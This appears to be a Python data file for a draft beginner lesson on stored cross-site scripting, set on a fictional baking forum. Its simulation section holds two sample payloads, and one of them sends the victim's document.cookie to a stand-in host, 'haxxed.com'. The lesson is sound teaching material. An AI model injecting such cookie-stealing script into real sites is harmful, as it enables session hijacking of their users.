LESSON = {
    "slug": "cross-site-scripting",
    "title": "Cross‑Site Scripting (XSS)",
    "summary": "Draft lesson about stored cross-site scripting attacks and defenses.",
    "difficulty": "beginner",
    "sort_order": 3,
    "estimated_minutes": 15,
    "simulation_key": "cross-site-scripting",
    "required_locales": ("fa", "en"),
    "guide_path": "/lessons/cross-site-scripting-guide",
    "lessons_path": "/lessons",
    "total_steps": 7,
    "final_step": 6,
    "steps": [
        [
            {"type": "text", "text": "Imagine you are the owner of "},
            {"type": "strong", "text": "breddit.com"},
            {
                "type": "text",
                "text": ", the number one social media site for the baking industry. You have an avid community of commenters who love sharing their bread knowledge.",
            },
        ],
        [{"type": "text", "text": "Because the main use of your website is to facilitate discussion, users can add comments, which are saved to the database and displayed to other users."}],
        [{"type": "text", "text": "Unfortunately the popularity of your site has also attracted the attention of hackers, who want to access your site for nefarious purposes."}],
        [{"type": "text", "text": "Unless you are careful when constructing the HTML, hackers can abuse the comment function by injecting JavaScript."}],
        [
            {"type": "text", "text": "Watch how "},
            {"type": "strong", "text": "Mal"},
            {"type": "text", "text": " injects malicious JavaScript to attack another user."},
        ],
        [{"type": "text", "text": "A real attack might use injected JavaScript to redirect Vic to a malicious website under Mal's control, allowing Mal to steal his cookies."}],
        [{"type": "text", "text": "Let's learn how to protect against cross-site scripting!"}],
    ],
    "simulation": {
        "site_url": "www.breddit.com",
        "thread_title": "How much do you folks like bread?",
        "comments": [
            {"author": "roll_with_it", "text": "i dream of baking tins."},
            {
                "author": "k_knead_you_right_now",
                "text": "i love it so much, i think i might be part duck",
            },
        ],
        "placeholder": "Type a comment...",
        "attacks": {
            "4": "<script>alert('Your croissants are limp and sad')</script>",
            "5": "<script>window.location='haxxed.com?cookie=' + document.cookie</script>",
        },
        "alert": "Your croissants are limp and sad",
    },
    "guide": {
        "overview": {
            "title": "Cross‑Site Scripting",
            "metrics": [
                {"icon": "📊", "label": "Prevalence", "value": "Common", "tone": "orange"},
                {"icon": "💣", "label": "Exploitability", "value": "Easy", "tone": "red"},
                {"icon": "🔥", "label": "Impact", "value": "Harmful", "tone": "rose"},
            ],
            "paragraphs": [
                [
                    {"type": "strong", "text": "Cross‑site scripting"},
                    {
                        "type": "text",
                        "text": " (XSS) is one of the most common methods hackers use to attack websites. XSS vulnerabilities permit a malicious user to execute arbitrary chunks of JavaScript when other users visit your site.",
                    },
                ],
                [
                    {
                        "type": "strong",
                        "text": "XSS is the most common publicly reported security vulnerability, and part of every hacker's toolkit.",
                    }
                ],
            ],
        },
        "status": "draft",
        "missing": ["quiz", "code_samples", "final guide review"],
    },
}


def inline_plain_text(parts):
    return "".join(part["text"] for part in parts if part["type"] != "break")
